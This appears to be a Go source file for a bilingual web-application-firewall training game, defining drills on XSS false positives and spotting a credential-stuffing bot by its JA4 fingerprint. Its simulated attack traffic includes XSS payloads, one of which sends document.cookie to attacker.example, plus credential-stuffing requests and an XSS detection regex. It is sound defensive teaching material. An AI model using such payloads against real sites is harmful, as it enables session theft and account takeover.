package scenario

import (
	"fmt"
	"math/rand/v2"
	"time"

	"wafdy/internal/tlsprofile"
	w "wafdy/internal/wafrule"
)

// ---------------------------------------------------------------------------
// 運用演習: 本番では、新しいルールをいきなり Block にせず、Count で様子を見てログを調べる。
// 「偵察」の実行は採点されないので、Count のルールで何に一致するかをログで確かめてから本番に臨む。
// ---------------------------------------------------------------------------

func opsDrill(s *Scenario) {
	s.Ops = true
	s.Recon = true
	if s.Duration == 0 {
		s.Duration = 30 * time.Second
	}
	register(s)
}

var reconLesson = []Text{
	T("【Count で偵察する】ルールの Action を Count にすると、一致したリクエストはブロックされず、ログに「一致した」とだけ記録されます。「偵察する」ボタンは採点されない実行なので、まず Count のルールで偵察し、何に一致したかをログで確かめましょう。",
		"【Recon with Count】Setting a rule's action to Count records matches in the logs without blocking anything. The \"Recon\" button runs traffic without scoring, so first scout with a Count rule and check in the logs what it matched."),
	T("【ログの見方】CloudWatch の Logs Insights で、ロググループ aws-waf-logs-{acl} を選びます。Count で一致したリクエストは nonTerminatingMatchingRules に、ブロックされたリクエストは terminatingRuleId に、ルール名が入ります。",
		"【Reading the logs】In CloudWatch Logs Insights, select the log group aws-waf-logs-{acl}. Requests matched by a Count rule list the rule name in nonTerminatingMatchingRules; blocked requests list it in terminatingRuleId."),
	T("【クエリの例】Count のルールに一致したリクエストを、パスごとに数える: fields @timestamp, httpRequest.uri | filter nonTerminatingMatchingRules.0.ruleId = \"<ルール名>\" | stats count(*) as n by httpRequest.uri | sort n desc",
		"【Example query】Count requests matched by a Count rule, grouped by path: fields @timestamp, httpRequest.uri | filter nonTerminatingMatchingRules.0.ruleId = \"<rule name>\" | stats count(*) as n by httpRequest.uri | sort n desc"),
	T("【ヘッダーを見る】気になるリクエストのヘッダーは httpRequest.headers に入っています: fields httpRequest.uri, httpRequest.headers.0.name, httpRequest.headers.0.value ... のように見るか、fields @message でログの全体を表示します。",
		"【Looking at headers】A request's headers are in httpRequest.headers. View them with fields httpRequest.uri, httpRequest.headers.0.name, httpRequest.headers.0.value ..., or show the whole log entry with fields @message."),
}

func registerOpsDrills() {
	xss := `<\s*(script|img|svg|iframe)|\bon[a-z]+\s*=|javascript:`
	opsDrill(&Scenario{
		ID:    "ops-1-false-positive-hunt",
		Title: T("運用演習 1: 誤検知の犯人探し", "Ops drill 1: hunting down false positives"),
		Summary: T("XSS 対策のルールを本番に入れる前に、Count で偵察して、巻き込んでしまう正規の通信を見つけてください。",
			"Before putting an XSS rule into production, scout with Count and find the legitimate traffic it would catch."),
		Topics: []Text{T("Count アクション", "The Count action"), T("Logs Insights", "Logs Insights"), T("誤検知の調査", "Investigating false positives")},
		Briefing: []Text{
			T("口コミ欄 (POST /comment) とプロフィール (POST /profile) への XSS が増えています。セキュリティチームから「Body に HTML タグやイベントハンドラーが入っていたらブロックしよう」という案が来ました。",
				"XSS against the review form (POST /comment) and profiles (POST /profile) is on the rise. The security team proposes \"block bodies containing HTML tags or event handlers\"."),
			T("ただし、このサイトにはあなたの知らない正規の利用者もいます。どんな通信があるかは、この画面には書かれていません。いきなり Block にせず、まず Count で偵察し、ルールに一致した通信をログで確かめてください。",
				"But this site has legitimate users you don't know about, and this page doesn't describe the traffic. Don't go straight to Block: scout with Count first and check in the logs what your rule matched."),
		},
		Lesson: reconLesson,
		Hints: []Text{
			T("偵察してログを見ると、/comment と /profile 以外にも、XSS のルールに一致するパスが見つかるはずです。そのリクエストのヘッダーも調べましょう。",
				"After a recon run, the logs should reveal a path other than /comment and /profile that matches your XSS rule. Look at that request's headers too."),
			T("正規の利用者は、ある取引先のシステムです。そのパスへ、そのシステムだけが付けるヘッダー付きで来たものだけを例外にします。",
				"The legitimate user is a partner's system. Exempt only requests to that path that carry the header only that system sends."),
		},
		HideBenignSamples: true,
		Patterns: []Pattern{
			{Attack, T("口コミ欄の XSS", "XSS in the review form"), 12, func(r *rand.Rand) Request {
				return atk(r, comment(r, pick(r, []string{"<script>alert(1)</script>", `<img src=x onerror=alert(1)>`, `<svg/onload=alert(1)>`})))
			}},
			{Attack, T("プロフィールの XSS", "XSS in profiles"), 12, func(r *rand.Rand) Request {
				return atk(r, post(r, "/profile", form("bio", `<a href="javascript:alert(1)">me</a>`)))
			}},
			{Attack, T("鍵なしでテンプレート API に XSS", "XSS to the template API without a key"), 12, func(r *rand.Rand) Request {
				return withBody(atk(r, post(r, "/api/templates", "")), "text/html", `<html><body><script>fetch("//attacker.example/"+document.cookie)</script></body></html>`)
			}},
			{Benign, T("取引先のメールテンプレート同期", "A partner syncing email templates"), 20, func(r *rand.Rand) Request {
				req := withBody(post(r, "/api/templates", ""), "text/html", `<html><body><img src="cid:logo" onload="trackOpen()"><p>Dear customer</p></body></html>`)
				req.Headers["User-Agent"] = "template-sync/1.8"
				return withHeader(req, "X-Partner-Key", "pk-"+randomText(r, 20))
			}},
			{Benign, T("記号を含む口コミ", "Reviews with symbols"), 20, func(r *rand.Rand) Request {
				return comment(r, pick(r, []string{"Size 2 < 3 fits better", "I <3 this shop", "Price/quality ratio > 9000"}))
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("block-xss-except-partner-templates", w.And(
			w.Regex(xss, w.BodyField(), w.URLDecode, w.HTMLEntityDecode, w.Lowercase),
			w.Not(w.And(
				w.StartsWith("/api/templates", w.UriPath(), w.Lowercase),
				w.Present(w.Header("x-partner-key")),
			)),
		)),
		SolutionNote: []Text{
			T("偵察すると、/api/templates へ X-Partner-Key 付きで送られる取引先のメールテンプレートが、XSS のルールに一致していることがわかります。メールの HTML には img タグや onload が正規に含まれます。",
				"Recon reveals that a partner's email templates, sent to /api/templates with X-Partner-Key, match the XSS rule. Email HTML legitimately contains img tags and onload."),
			T("例外は「/api/templates への」AND「X-Partner-Key 付きの」リクエストだけにします。鍵のない /api/templates への XSS は止まります。",
				"Exempt only requests that are \"for /api/templates\" AND \"carry X-Partner-Key\". XSS sent to /api/templates without a key is still blocked."),
			T("2 < 3 や <3 のような記号だけの口コミは、タグ名やイベントハンドラーの形になっていないので止まりません。",
				"Reviews with bare symbols like 2 < 3 or <3 don't form tag names or event handlers, so they aren't blocked."),
		},
		Pitfall: w.Block("pitfall-ops-xss", w.Regex(xss, w.BodyField(), w.URLDecode, w.HTMLEntityDecode, w.Lowercase)),
		PitfallNote: []Text{
			T("偵察せずに、セキュリティチームの案をそのまま Block にしたルールです。取引先のメールテンプレート同期をすべて止めてしまいます。",
				"This is the security team's proposal put straight into Block without recon. It stops every one of the partner's template syncs."),
		},
	})

	stuffer := tlsprofile.JA4(tlsprofile.Stuffer)
	opsDrill(&Scenario{
		ID:    "ops-2-find-the-bot",
		Title: T("運用演習 2: ログからボットを特定せよ", "Ops drill 2: identify the bot from the logs"),
		Summary: T("ログインへのリスト型攻撃。IP も User-Agent も毎回違います。ログを調べて、ボットだけが持つ特徴を見つけてください。",
			"Credential stuffing against login, with a different IP and User-Agent every time. Dig through the logs to find a trait only the bot has."),
		Topics:  []Text{T("Logs Insights の集計", "Aggregating in Logs Insights"), T("JA4 フィンガープリント", "JA4 fingerprints")},
		ShowJA4: false,
		Briefing: []Text{
			T("POST /login への失敗が急増しています。送信元 IP は毎回違い、User-Agent も本物のブラウザと同じです。今回は、攻撃に使われているツールの情報がありません。",
				"Failures on POST /login have spiked. Every source IP is different, and the User-Agents match real browsers. This time there's no information about the tool being used."),
			T("偵察を実行し、WAF ログで /login へのリクエストを JA4 ごとに数えてみてください。ほかのページにはほとんど現れず、/login にだけ大量に現れる JA4 があるはずです。",
				"Run a recon and count /login requests by JA4 in the WAF logs. There should be a JA4 that shows up in bulk on /login but hardly anywhere else."),
			T("取引先の在庫連携システム (GET /api/inventory) は、ブラウザとは違う JA4 で接続してきます。これは止めないでください。",
				"A partner's inventory sync system (GET /api/inventory) connects with a non-browser JA4. Don't block it."),
		},
		Lesson: append([]Text{
			T("【JA4 で集計する】/login へのリクエストを JA4 ごとに数えるクエリ: fields ja4Fingerprint | filter httpRequest.uri = \"/login\" | stats count(*) as n by ja4Fingerprint | sort n desc 。ほかのページと比べると、ボットだけの JA4 が見えてきます。",
				"【Aggregating by JA4】A query counting /login requests per JA4: fields ja4Fingerprint | filter httpRequest.uri = \"/login\" | stats count(*) as n by ja4Fingerprint | sort n desc. Compare with other pages and the bot-only JA4 stands out."),
		}, reconLesson...),
		Hints: []Text{
			T("偵察ではルールがなくても構いません (すべて Allow のまま流れます)。ログを集計するだけで十分です。",
				"You don't even need a rule for the recon (everything flows through as Allow). Aggregating the logs is enough."),
			T("見つけた JA4 を、JA4 fingerprint の完全一致でブロックします。取引先の JA4 と取り違えないように注意しましょう。",
				"Block the JA4 you find with an exact match on JA4 fingerprint. Be careful not to confuse it with the partner's JA4."),
		},
		Patterns: []Pattern{
			{Attack, T("リスト型攻撃のボット", "Credential-stuffing bot"), 40, func(r *rand.Rand) Request {
				req := atk(r, post(r, "/login", form("username", fmt.Sprintf("victim%03d@example.com", r.IntN(1000)), "password", "Autumn2026!")))
				return withTLS(req, tlsprofile.Stuffer)
			}},
			{Benign, T("一般ユーザーのログイン", "Regular users logging in"), 20, func(r *rand.Rand) Request {
				return post(r, "/login", form("username", fmt.Sprintf("user%03d@example.com", r.IntN(1000)), "password", "correct-horse-battery"))
			}},
			{Benign, T("取引先の在庫連携システム", "Partner's inventory sync system"), 15, func(r *rand.Rand) Request {
				req := get(r, "/api/inventory", q("sku", fmt.Sprintf("SKU-%05d", r.IntN(100000))))
				req.Headers["User-Agent"] = "inventory-sync/2.4"
				return withTLS(req, tlsprofile.HTTPLib)
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("block-stuffing-bot-ja4", w.Exactly(stuffer, w.JA4())),
		SolutionNote: []Text{
			T("ボットの JA4 は "+stuffer+" でした。/login にだけ大量に現れ、ほかのページにはまったく現れません。",
				"The bot's JA4 was "+stuffer+". It appears in bulk on /login and nowhere else."),
			T("ログを集計して「攻撃だけに共通する特徴」を見つけるのは、情報のない新しい攻撃に対応するときの基本の動きです。JA4 のほかに、ヘッダーの並びや特定のパラメータが手がかりになることもあります。",
				"Aggregating logs to find a trait shared only by the attack is the basic move against new attacks with no published information. Besides JA4, header order or specific parameters can also be clues."),
		},
	})
}
